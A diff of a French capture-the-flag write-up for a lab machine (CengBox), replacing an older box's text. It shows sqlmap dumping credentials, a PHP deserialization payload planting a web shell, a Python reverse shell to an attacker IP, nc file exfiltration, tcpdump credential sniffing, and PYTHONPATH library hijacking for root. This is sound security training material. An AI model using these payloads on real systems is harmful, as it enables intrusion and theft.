@@ -23,8 +23,9 @@ You know what you have to do. If you get stuck, you can get in touch with me on 
 *   [Admin panel via SQL Injection](#admin-panel-via-sql-injection)
 *   [Shell basique](#shell-basique)
 *   [Privesc utilisateur](#Privesc-utilisateur)
-*   [Privesc root - 1ère méthode](#privilege-escalation)
-*   [Privesc root - 2ème méthode](#privilege-escalation)
+*   [Privesc root - 1ère méthode](#privilege-escalation-méthode-1)
+*   [Privesc root - 2ème méthode](#privilege-escalation-méthode-2)
+*   [Conclusion](#conclusion)
 
 * * *
 
@@ -352,8 +353,85 @@ Mais avant de se connecter avec les identifiants on peut utiliser une autre tech
 ## Admin panel via SQL injection
 * * *
 
+L'autre technique est donc d'utiliser une injection SQL via le formulaire de login de la page.
 
+Pour se faire rien de plus simple, il suffit de lancer BurpSuite, de faire une requête sur cette même page de login. On devrait intercepter la requête suivante :
 
+```
+POST /login.php HTTP/1.1
+Host: dev.ceng-company.vm
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+Origin: http://dev.ceng-company.vm
+Connection: close
+Referer: http://dev.ceng-company.vm/
+Upgrade-Insecure-Requests: 1
+
+username=test%40test.test&passwd=test
+```
+
+A préciser qu'ici le ``username`` et ``passwd`` ne sont pas importants, c'est juste pour pouvoir capturer la requête.
+
+On va ensuite utiliser l'outil ``sqlmap`` pour tenter d'effectuer une injection SQL sur la page de login.
+
+L'utilisation principale de cet outil se fait généralement en donnant une URL avec des paramètres définis comme par exemple :
+
+```
+sqlmap -u "http://random-wesbite.com/index.php?id=test"
+```
+
+Mais on peut aussi utiliser l'option ``--forms`` qui permet de spécifier uniquement la page souhaitée et qui va chercher **automatiquement** tous les formulaires contenus dans la page.
+
+Vu qu'on ne va pas spécifier d'URL, on va utiliser l'option ``-r`` qui va nous permettre de passe à ``sqlmap`` un fichier texte qui contient la requête à effectuer.
+
+Pour récupérer ce fichier il suffit sur BurpSuite de faire un clic droit sur la requête puis de sélectionner "Save Item" et de l'enregistrer dans un fichier.
+
+Le fichier est un document XML qui contient toutes les informations de la requête.
+
+Voici un exemple de son contenu :
+
+```
+<items burpVersion="2020.11.3" exportTime="Sun Dec 27 14:02:53 CET 2020">
+  <item>
+    <time>Sun Dec 27 13:04:49 CET 2020</time>
+    <url><![CDATA[http://dev.ceng-company.vm/login.php]]></url>
+    <host ip="192.168.1.109">dev.ceng-company.vm</host>
+    <port>80</port>
+    <protocol>http</protocol>
+```
+
+On va ensuite le passer à ``sqlmap`` avec la commande suivante :
+
+```bash
+sqlmap -r sqlmap.txt --dbs --tamper=between
+```
+
+- **-r** pour lire la requête HTTP depuis un fichier
+- **--dbs** permet de lister les bases de données
+- **--tamper** permet de temporiser entre chaque requête. Cette option est directement recommandée par sqlmap.
+
+Un fois qu'on a récupéré la liste des bases de données du site on peut affiner notre recherche pour n'afficher que les champs de la table qui nous intéressent :
+
+```bash
+sqlmap -r sqlmap.txt -D cengbox -U users --dump --tamper=between
+```
+
+```
++----+-------+------------------------------+-------------+
+| id | name  | login                        | password    |
++----+-------+------------------------------+-------------+
+| 1  | Admin | admin@ceng-company.vm        | admin*_2020 |
+| 2  | Admin | elizabethsky@ceng-company.vm | walnuttree  |
++----+-------+------------------------------+-------------+
+```
+
+On a donc récupéré les logins pour se connecter au panel admin ainsi que les mots de passe en clair.
+
+Après avoir fait des tests on se rend compte que les deux utilisateurs possèdent les droits administrateurs. Il n'y a donc pas d'importance dans le choix du compte avec lequel on va se connecter.
 
 
 
@@ -361,46 +439,308 @@ Mais avant de se connecter avec les identifiants on peut utiliser une autre tech
 
 ## Shell basique
 
-Pour ce faire j'ai utilisé **nc**.
+On a maintenant accès à une page qui nous permet d'ajouter des poèmes.
+
+Si on tente d'en ajouter un pour voir comment le site réagit on obtient l'URL suivante :
+
+```
+http://dev.ceng-company.vm/addpoem.php?data=O%3A4%3A%22Poem%22%3A3%3A%7Bs%3A8%3A%22poemName%22%3Bs%3A5%3A%22shell%22%3Bs%3A10%3A%22isPoetrist%22%3BO%3A8%3A%22poemFile%22%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A22%3A%22%2Fvar%2Fwww%2Fhtml%2Fpoem.txt%22%3Bs%3A8%3A%22poemName%22%3Bs%3A5%3A%22shell%22%3B%7Ds%3A9%3A%22poemLines%22%3Bs%3A21%3A%22%3C%3Fphp+echo+%22test%22%3B+%3F%3E%22%3B%7D
+```
+
+Cependant elle est encodée. On va donc utiliser un décodeur en ligne pour retrouver une URL plus lisible :
+
+```
+http://dev.ceng-company.vm/addpoem.php?data=O:4:"Poem":3:{s:8:"poemName";s:5:"shell";s:10:"isPoetrist";O:8:"poemFile":2:{s:8:"filename";s:23:"/var/www/html/poem.txt";s:8:"poemName";s:5:"shell";}s:9:"poemLines";s:21:"shell";}
+```
+
+On peut ensuite retourner sur la page ``http://ceng-company.vm/poem.txt`` pour visualiser le poème qu'on vient d'ajouter.
+
+On peut voir plusieurs champs intéressants dans le *json* qui est envoyé via l'URL. Notamment le chemin où est enregistré le poème.
+
+Il suffit de modifier l'URL à plusieurs reprises avec des champs différents pour savoir quel est le contenu qui est enregistré dans le fichier. 
+
+On s'aperçoit que c'est le second champ nommé **poemName** qui est inséré dans lke fichier. 
+
+Grâce à ces informations on va pouvoir tenter d'ajouter au fichier des données qui nous permettent d'obtenir un shell sur la machine cible.
 
 
+De ce fait, si on tente par exemple d'écrire du texte dans un autre fichier que poem.txt alors on pourra y accéder.
 
-On ne va pas aller trop loin et rechercher dans le dossier **admin** si on trouve quelque chose d'important.                                                                                     
-Et effectivement nous sommes servis !
+Attention cependant, lors du changement des données dans l'URL il faut bien faire attention de changer également la taille de la chaine spécifier par ``s:TAILLE``.
 
-Ça nous sera sûrement utile par la suite. Avec un petite recherche Google sur **$apr1** on se rend compte qu'il s'agit de MD5 utilisé par Apache avec plusieurs itérations. Le lien [ici](https://httpd.apache.org/docs/2.4/fr/misc/password_encryptions.html).
+On va donc essayer d'insérer du code php dans un fichier qu'on nommera ``shell.php`` pour pouvoir exécuter du code :
 
-Heureusement j'ai toujours **hashcat** sous la main et ça tombe bien puisqu'il possède un mode pour cracker les hashs MD5 utilisés par Apache :
+```
+http://dev.ceng-company.vm/addpoem.php?data=O:4:"Poem":3:{s:8:"poemName";s:5:"shell";s:10:"isPoetrist";O:8:"poemFile":2:{s:8:"filename";s:23:"/var/www/html/shell.php";s:8:"poemName";s:42:"<?php system($_GET['cmd']);?>";}s:9:"poemLines";s:21:"shell";}
+```
 
+On se retrouve alors avec le chemin : ``/var/www/html/shell.php`` et ce qui va être écrit dans le fichier : ``<?php system($_GET['cmd']);?>``.
 
-Après quelques instants on trouve le mot de passe : **jessie**.
+Si on tente de se rendre à l'URL ``http://ceng-company.vm/shell.php`` et qu'on ajoute le paramètre ``cmd=COMMAND`` en remplaçant **COMMAND** par la commande à exécuter alors on voit bien qu'on arrive à communiquer directement avec le serveur.
 
-Nous avons donc la combinaison suivante : ``itsmeadmin:jessie``.                                                                                                                                       
-Sur la machine il n'y a pas de compte nommé **itsmeadmin** donc on ne peut que l'utiliser sur le site web à l'adresse : http://192.168.1.47/admin
-
-Effectivement on se retrouve connectés. Sur cette page on retrouve un bouton **Clean Downloads** qui exécute une commande via l'URL : 
-
-
-Ok, donc on doit pouvoir nous aussi exécuter des commandes via cette URL. Essayons :
-
-
-
-Le résultat n'est pas aussi flamboyant qu'on l'aurait espéré :
+```
+http://ceng-company.vm/shell.php?cmd=id
+```
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
 
+On peut alors obtenir un shell sur la machine grâce au reverse shell suivant (il faut bien se mettre en écoute sur notre machine auparavant) : 
 
-Effectement, on peut **exécuter** des commandes avec les droits de l'utilisateur ``www-data`` mais pour le moment peu d'utilités puisque nous avons déjà un shell avec cet utilisateur.
-Il s'agit donc soit d'une fausse piste, soit il y a une autre façon d'exploiter ceci.
+```
+http://ceng-company.vm/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.91",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
 
-De retour côté shell je tente de lancer un petit **[linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)** pour voir les potentielles données intéressantes (SUID, cronjobs, passwords, configs ...). Mais rien de très probant.
-
-J'ai appris il n'y a pas si longtemps que même s'il n'y avait rien dans les cron jobs il fallait quand même vérifier les services qui tournaient périodiquement sur la machine. Et effectivement ça m'a servi puisque qu'en utilisant **[pspy64](https://github.com/DominicBreuker/pspy)** on se rend compte que **root** lance toutes les minutes la commande suivante :
-
-Bingo ! Il nous suffit de le modifier pour ajouter notre reverse shell qui sera exécuté par ``root`` :
+**Attention** il faut bien remplacer l'adresse IP ainsi que le port en fonction de vous.
 
 
-Cette box n'était pas très compliquée même si elle m'a fait chercher pendant quelques temps comment **bypass les espaces** dans l'URL ainsi que le service qui tournait en fond mais qui n'était pas dans les **cron jobs**.
+* * *
 
-Merci à [@over_jt](https://twitter.com/over_jt) pour cette box !
+## Privesc utilisateur
 
-Les prochaines fois faîtes bien **attention** ! Si vous ne voyez pas de cron jobs actifs cela ne veut pas dire qu'il n'y a rien qui tourne **périodiquement** sur la machine !
+Pour avoir un shell un peu plus fonctionnel et propre on peut spawn un shell bash grâce à ``python3`` :
+
+```bash
+python3 -c "import pty;pty.spawn('/bin/bash')"
+```
+
+Si on regarde le fichier ``/etc/passwd`` on voit bien qu'il n'y a qu'un seul utilisateur sur la machine :
+
+```
+eric:x:1000:1000:eric,,,:/home/eric:/bin/bash
+```
+
+On peut tenter de chercher tous les fichiers qui appartiennent à cet utilisateur :
+
+```bash
+find / -user eric 2>/dev/null
+```
+
+Et on trouve le fichier ``/opt/login.py`` mais on n'a pas les droits nécessaires pour y accéder.
+
+Avec un :
+
+```bash
+netstat -nutelap 
+```
+
+On peut voir que la base de données ``MySQL`` tourne en local.
+
+Après avoir fouillé dans les fichiers du site web, on tombe sur des indentifiants plutôt intéressants :
+
+```
+/var/www/dev.ceng-company.vm/conn.php
+```
+```
+$db_user = "elizabeth";
+$db_passwd = "3liz4B3TH2020!Covid19";
+```
+
+On tente alors de s'y connecter avec ce qu'on vient de trouver :
+
+```bash
+mysql -u elizabeth -p -> 3liz4B3TH2020!Covid19
+```
+
+Malheureusement ça ne fonctionne pas.
+
+
+Si on regarde les capabilities sur la machine on se retrouve avec :
+
+```bash
+getcap -r / 2>/dev/null
+```
+```
+/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
+```
+
+Ce qui signifie qu'on peut lancer ``tcpdump`` avec les droits administrateur.
+
+On va donc tenter d'écouter le réseau pour voir de potentiels paquets intéressants.
+
+Il nous faut d'abord lister toutes les interfaces disponibles pour savoir sur laquelle il faut écouter :
+
+```bash
+tcpdump -D
+```
+
+On va tout écouter sauf notre machine puisqu'elle envoie beaucoup trop de données qui parasitent la capture et qui ne servent à rien :
+
+```bash
+tcpdump -i any -s0 "host not 192.168.1.91" -w /tmp/result.pcap
+```
+
+- **-i** permet de spécifier l'interface sur laquelle on écoute. Ici on écoute sur tout
+- **-s0** permet de capturer les paquets dans leur entièreté sans qu'ils soient tronqués et donc illisibles.
+- **"host not 192.168.1.91"** comme sur ``Wireshark`` on peut spécifier des filtres. Ici on ne veut pas notre machine attaquante.
+- **-w** va écrire les résultats dans un fichier ``.pcap`` pour ensuite pouvoir le lire de manière plus fluide directement sur ``Wireshark``.
+
+
+Après avoir écouté plusieurs minutes, on stop ``tcpdump`` et on transfert le fichier qui contient les échanges réseau sur notre machine hôte pour l'analyser :
+
+```
+Côté attaquant : nc -lnvp 6666 > "result.pcap"
+Côté cible : nc 192.168.1.91 6666 < "result.pcap"
+```
+
+Sur ``Wireshark`` on peut apercevoir une **requête HTTP** intéressante :
+
+```
+username=eric&password=3ricThompson%2ACovid19
+```
+
+En effet, elle contient des identifiants qui transitent en clair directement sur le réseau.
+
+Si on tente de se connecter sur la machine cible à l'utilisateur ``eric`` avec le mot de passe ``3ricThompson*Covid19`` (attention à bien décoder %2A) on réussi !
+
+```bash
+cat /home/eric/user.txt
+```
+```
+If someone asks us when we die tomorrow: ‘What have you seen in the world? If he said, we probably cannot find the answer to give. We don't have time to see it from running. -- Sabahattin Ali
+
+flag(6744e509eec439570c2d6df947526749)
+```
+
+## Privesc root méthode 1
+
+Ici c'est la méthode la plus **badass** pour passer root. On verra ensuite une autre méthode beaucoup plus simple.
+
+Maintenant que nous sommes connectés en tant qu'``eric`` on a accès à de nouveaux fichiers :
+
+```
+/opt/login.py :
+
+import requests
+creds = {'username':'eric','password':'3ricThompson*Covid19'}
+r = requests.post('http://localhost',data = creds)
+print(r.text)
+```
+
+Ce sont les identifiants trouvés via ``tcpdump`` donc ce n'est plus utile.
+
+```
+/opt/check.sh :
+
+#!/bin/bash
+/usr/bin/python3 /opt/whatsmyip.py
+```
+
+C'est un script bash qui va juste lancer le fichier ``/opt/whatsmyip.py`` avec ``python3``.
+
+
+```
+/opt/whatsmyip.py :
+
+import requests
+r = requests.get(r'http://jsonip.com')
+ip= r.json()['ip']
+print('Your IP is {}'.format(ip))
+```
+
+On a un fichier python qui va faire une requête sur un site web pour récupérer notre adresse IP publique. On garde ça de côté pour apprès.
+
+En continuant l'énumération on s'aperçoit que l'utilisateur a des droits ``sudo`` spécifiques :
+
+```bash
+sudo -l
+```
+```
+(ALL : ALL) SETENV: NOPASSWD: /opt/check.sh
+```
+
+Ici l'utilisateur peut lancer le script ``/opt/check.sh`` en tant que root en ayant en plus la possibilité de modifier les variables d'environnement lors de l'exécution de celui-ci.
+
+
+La faille vient du fichier python et plus précisément de la ligne :
+
+```
+import requests
+```
+
+En effet, il est possible de modifier le répertoire de base de python pour qu'il aille chercher dans un autre répertoire. Dans ce répertoire onj va créer un fichier qui contient du code malicieux et on va le nommer ``requests.py``. 
+
+De ce fait ce sera notre ``requests.py`` qui sera appelé à la place de celui légitime.
+
+Le nom de cette vulnérabilité est **Python Library Hijacking**.
+
+* * *
+
+#### Petit bonus :  
+
+Si vous voulez connaître le répertoire par défaut dans lequel tous les scripts se trouvent :
+
+```bash
+python3 -c 'import sys; print("\n".join(sys.path))'
+```
+
+Il faut maintenant trouver le nom de la variable d'environnement qui permet de définir le chemin vers le répertoire par défaut des librairies de python.
+
+Après quelques rechercent sur Internet, on trouve qu'il s'agit de la variable **PYTHONPATH**.
+
+On va donc créer un nouveau fichier nommé ``requests.py`` dans le répertoire ``/tmp`` et qui va contenir le code pour obtenir un shell root :
+
+```bash
+echo 'import os; os.system("/bin/bash")' > /tmp/requests.py
+```
+
+On lance ensuite les commandes suivantes pour exécuter le script en passnt également notre variable ``PAYHTONPATH`` modifiée :
+
+```bash
+export PYTHONPATH=/tmp/
+sudo --preserve-env /opt/check.sh 
+```
+
+Ici on modifie d'abord la variable puis on indique l'option ``--preverse-env`` de sudo pour que les variables d'environnement restent les mêmes lorsqu'elles sont exécutées via un autre utilisateur.
+
+On peut aussi spécifier uniquement la variable à remplacer :
+
+```bash
+sudo PYTHONPATH=/tmp/ /opt/check.sh
+```
+
+On obtient donc notre shell en tant que root !
+
+```bash
+cat /root/proof.txt
+```
+```
+flag(058004ef45a08082100802d41fdcc290)
+```
+
+
+## Privesc root méthode 2
+
+Autre méthode possible pour passer root : il suffit de lancer l'outil ``pspy64`` pour écouter en local tous les processus qui sont lancés :
+
+```
+2021/01/16 18:13:01 CMD: UID=0    PID=2394   | /usr/bin/python3 /opt/login.py
+```
+
+On voit bien ici que le script ``/opt/login.py`` qui envoie des données sur le réseau est exécuté en tant que root. 
+
+Heureusement on a les droits de modification sur ce fichier en étant connecté avec ``eric`` :
+
+```bash
+ls -la /opt/login.py
+```
+```
+-rwx------  1 eric eric  143 Sep 28 13:28 login.py
+```
+
+On peut alors modifier le fichier python pour y ajouter un reverse shell par exemple et donc attendre quelques instants pour recevoir la connexion et donc passer root !
+
+
+* * *
+
+## Conclusion
+
+Cette box fait partie de mes box **préférées** faites jusqu'à présent. Elle est plutôt réaliste et ça a été unn vrai plaisir pour moi de la faire.
+
+Merci à vous qui êtes arrivés jusqu'ici !
+
+Un grand merci également au créateur de la box. Vous pouvez le retrouver sur Twitter : [@arslanblcn_](https://twitter.com/arslanblcn_).
+
+
+Me concernant vous pouvez me retrouver également sur [Twitter](https://twitter.com/ZworKrowZ) ou sur mon serveur [Discord](https://discord.gg/v6rhJay)
